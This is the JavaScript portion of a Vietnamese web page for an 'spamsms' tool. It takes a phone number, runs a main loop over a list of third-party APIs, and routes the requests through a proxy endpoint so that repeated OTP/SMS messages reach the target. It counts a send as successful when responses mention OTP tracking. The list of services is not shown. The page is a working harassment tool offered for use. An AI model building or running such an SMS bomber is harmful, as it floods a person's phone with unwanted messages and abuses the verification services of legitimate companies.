        function addLog(msg, type = 'info') {
            const time = new Date().toLocaleTimeString('vi-VN');
            const div = document.createElement('div');
            div.className = 'log-item';
            let cls = 'info';
            if (type === 'success') cls = 'success';
            else if (type === 'fail') cls = 'fail';
            else if (type === 'warning') cls = 'warning';
            div.innerHTML = `<span class="time">[${time}]</span><span class="msg ${cls}">${msg}</span>`;
            statusBox.appendChild(div);
            statusBox.scrollTop = statusBox.scrollHeight;
            logCounter++;
            logCount.textContent = logCounter;
            while (statusBox.children.length > 300) {
                statusBox.removeChild(statusBox.firstChild);
                logCounter--;
            }
        }

                }

                // Gửi qua proxy server
                const response = await fetch('/api/proxy', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        url: url,
                        method: api.method || 'POST',
                        headers: headers,
                        body: body
                    })
                });

                const result = await response.json();
                
                // Kiểm tra thành công
                const data = result.data;
                const isSuccess = data && (
                    typeof data === 'string' ? 
                        data.includes('success') || data.includes('otp') || data.includes('OK') || data.includes('200') :
                        data.success === true || data.status === 0 || data.code === 0 || data.otpTrackingId
                );

                return isSuccess ? 'OK' : 'FAIL';
            } catch (e) {
                return 'FAIL';
            }
        }

        // ===== HÀM SPAM CHÍNH =====
        async function runSpam(phone, count) {
            if (running) { addLog('⚠️ Đang chạy, vui lòng đợi', 'warning'); return; }
            if (!phone || phone.length < 9) { addLog('❌ Số điện thoại không hợp lệ', 'fail'); return; }
            let total = parseInt(count) || 1;
            if (total < 1) total = 1;
            if (total > 30) total = 30;

            running = true;
            stopRequested = false;
            successCount = 0;
            failCount = 0;
            updateStats();
            
            addLog(`🚀 Bắt đầu spam ${total} lượt cho ${phone} (${API_LIST.length} API)`, 'info');

            for (let i = 0; i < total; i++) {
                if (stopRequested) break;
                addLog(`--- Lượt ${i+1}/${total} ---`, 'info');
                for (let j = 0; j < API_LIST.length; j++) {
                    if (stopRequested) break;
                    const api = API_LIST[j];
                    try {
                        const result = await callApi(api, phone);
                        if (result === 'OK') {
                            successCount++;
                            addLog(`✅ ${api.name} -> Thành công`, 'success');
                        } else {
                            failCount++;
                            addLog(`❌ ${api.name} -> Thất bại`, 'fail');
                        }
                        updateStats();
                    } catch(e) {
                        failCount++;
                        addLog(`⚠️ ${api.name} -> Lỗi: ${e.message || 'unknown'}`, 'fail');
                        updateStats();
                    }
                    await new Promise(r => setTimeout(r, 30));
                }
                if (i < total - 1 && !stopRequested) {
                    addLog(`⏳ Chờ 500ms...`, 'info');
                    await new Promise(r => setTimeout(r, 500));
                }
            }

            running = false;
            addLog(`🏁 Hoàn thành! ✅ ${successCount} / ❌ ${failCount}`, successCount > failCount ? 'success' : 'fail');
        }

        // ===== SỰ KIỆN =====
        document.getElementById('startBtn').addEventListener('click', function() {
            runSpam(document.getElementById('phoneInput').value.trim(), document.getElementById('countInput').value);
        });

        document.getElementById('clearBtn').addEventListener('click', function() {
            statusBox.innerHTML = '';
            logCounter = 0;
            logCount.textContent = '0';
            successCount = 0;
            failCount = 0;
            updateStats();
            addLog('🗑️ Đã xóa log', 'info');
        });

        document.getElementById('stopBtn').addEventListener('click', function() {
            stopRequested = true;
            running = false;
            addLog('⏹️ Dừng theo yêu cầu', 'warning');
        });

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                runSpam(document.getElementById('phoneInput').value.trim(), document.getElementById('countInput').value);
            }
        });

        // ===== NHẠC =====
        const audio = document.getElementById('bgMusic');
        const playBtn = document.getElementById('playBtn');
        let isPlaying = false;

        document.addEventListener('click', function initAudio() {
            if (!isPlaying) {
                audio.play().catch(() => {});
                isPlaying = true;
                playBtn.innerHTML = '<i class="fas fa-pause"></i>';
            }
            document.removeEventListener('click', initAudio);
        }, { once: true });

        playBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            if (isPlaying) {
                audio.pause();
                isPlaying = false;
                playBtn.innerHTML = '<i class="fas fa-play"></i>';
            } else {
                audio.play().catch(() => {});
                isPlaying = true;
                playBtn.innerHTML = '<i class="fas fa-pause"></i>';
            }
        });

        addLog('🔥 spamsms sẵn sàng, chờ lệnh...', 'info');
        addLog('📡 Proxy server đang hoạt động', 'info');
    </script>
</body>
</html>
